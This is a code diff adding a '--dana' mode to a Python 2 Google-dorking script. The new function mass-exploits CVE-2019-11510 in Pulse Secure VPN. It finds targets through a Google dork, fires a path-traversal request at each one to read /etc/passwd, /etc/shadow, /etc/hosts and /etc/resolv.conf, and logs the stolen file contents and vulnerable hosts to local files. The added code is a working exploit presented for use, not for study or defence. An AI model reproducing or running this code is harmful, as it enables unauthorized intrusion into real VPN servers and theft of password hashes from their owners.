@@ -7,6 +7,7 @@ from time import sleep
 from PyPDF2 import PdfFileReader
 import requests
 import os
+import urllib2
 
 
 
@@ -35,6 +36,7 @@ parser.add_argument('-n', action="store", dest="results_n", help="Max number of 
 parser.add_argument('-v', action="store_true", dest="verbose", help="verbose", default="")
 parser.add_argument('-w', action="store", dest="Write_File", help="Write the results in a cool file.", default="")
 parser.add_argument('--meta', action="store_true", dest="meta", help="Select a url and search for metadata files. Only accept -u, -v, -e", default="")
+parser.add_argument('--dana', action="store_true", dest="dana", help="fun with CVE-2019-11510, use -u parameter to search for specific urls, or extensions. -u .es serach only in .es -n for number of results", default="")
 result = parser.parse_args()
 
 if result.Write_File != "":
@@ -138,8 +140,51 @@ def searching(url_s, dict, url_exc, othr):
 			peti(petition)
 
 
-
+def dana():
+	print "All vulnerable sites save in dana_gift.txt"
+	dork_dana = "inurl:/dana-na/ filetype:cgi"
+	files_search = ['/etc/resolv.conf', '/etc/shadow', '/etc/hosts']
+	if result.url_s != "":
+		result.url_s = "site:" + result.url_s
+	petition = "inurl:/dana-na/ filetype:cgi %s" % result.url_s 
+	print petition
+	aleluya = search(petition, stop=int(result.results_n), user_agent=result.user_agentt, pause=50.0)
+	dana_gift = open("dana_gift.txt", "wb")
+	dana_vulnerbles = open("dana_vulnerbles.txt", "wb")
+	for urlis in aleluya:
+		print(tc.bold_yellow(urlis))
+		print "Try that Shit:"
+		try:
+			urlis_f = urlis.split("/dana-na/")[0]
+			aa = "%s/dana-na/../dana/html5acc/guacamole/../../../../../../..%s?/dana/html5acc/guacamole/" % (urlis_f, "/etc/passwd")
+			print aa
+			aaa = urllib2.urlopen(aa).read()
+			if "Wrong URL." not in aaa:
+				print tc.italic_yellow("Shit it's vulnerable!!")
+				dana_gift.write("-----------------------\n")
+				dana_gift.write(urlis_f + "\n")
+				dana_gift.write("-----------------------\n")
+				dana_gift.write(aaa + "\n")
+				dana_vulnerbles.write(urlis_f + "\n")
+				print aaa
+				for i in files_search:
+					print tc.italic_yellow("Search for: %s" % i)
+					aa = "%s/dana-na/../dana/html5acc/guacamole/../../../../../../..%s?/dana/html5acc/guacamole/" % (urlis_f, i)
+					try:
+						aaa2 = urllib2.urlopen(aa).read()
+						print aaa2
+						dana_gift.write(aaa2 + "\n")
+					except:
+						print tc.bold_red("4fck4 not found")
+			else:
+				print tc.bold_red("Oh fck, it's no vulnerable :(")
+		except:
+			print tc.bold_red("Oh fck, it's no vulnerable :(")
+	dana_gift.close()
+	dana_vulnerbles.close()
 if result.meta:
 	meta()
+elif result.dana:
+	dana()
 else:
 	searching(result.url_s, result.dict, result.url_exc, result.othr)
